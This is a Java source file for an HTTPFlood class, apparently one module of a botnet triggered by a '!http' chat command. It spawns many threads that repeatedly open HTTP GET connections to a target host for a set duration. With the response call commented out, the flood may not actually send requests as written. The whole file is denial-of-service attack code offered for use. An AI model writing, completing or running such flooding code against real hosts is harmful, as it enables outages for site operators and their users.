import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.ProtocolException;
import java.net.URL;
/**
 * Created by phamm on 31.10.2016.
 */
public class HTTPFlood extends HostnameResolver
{
    private String host;
    private int delay;
    private int connections;
    private long duration;
    //delay in seconds, duration in seconds
    public HTTPFlood(String host, int delay, int connections, long duration) throws Exception
    {
        this.host = resolve(host);
        this.delay = delay;
        this.connections = connections;
        this.duration = duration;
        go();
    }

    public static String printHelp()
    {
        return "Usage: !http <target IP> <delay in miliseconds> <how many threads> <duration in seconds>";
    }

    @Override
    public String resolve(String host) throws Exception
    {
        return super.resolve(host);
    }

    public void go() throws Exception
    {
        for(int i = 1; i <= connections; i++)
        {
            new Thread(new Runnable()
            {
                @Override
                public void run()
                {
                    long endtime = System.currentTimeMillis() + (duration * 1000);
                    while(System.currentTimeMillis() < endtime)
                    {

                        try
                        {
                            HttpURLConnection.setFollowRedirects(false);
                            HttpURLConnection conn = (HttpURLConnection) (new URL(host)).openConnection();
                            conn.setRequestMethod("GET");
                            //conn.getResponseCode();
                            //conn = null;
                        }
                        catch(MalformedURLException m)
                        {

                        }
                        catch(IOException i)
                        {

                        }

                        try
                        {
                            Thread.sleep(delay);
                        }
                        catch(Exception e)
                        {

                        }
                    }
                }
            }).start();
        }
    }
}
